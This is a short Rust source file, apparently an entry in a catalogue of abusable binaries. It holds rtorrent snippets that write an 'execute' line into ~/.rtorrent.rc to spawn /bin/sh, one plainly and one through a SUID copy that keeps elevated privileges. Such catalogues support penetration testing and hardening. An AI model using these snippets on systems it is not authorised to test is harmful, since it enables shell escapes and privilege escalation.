pub static BIN_NAME: &'static str = "rtorrent";
pub static SH_CODE: &'static str = r#"
    
    echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
    rtorrent
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which rtorrent) .

    echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
    ./rtorrent
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
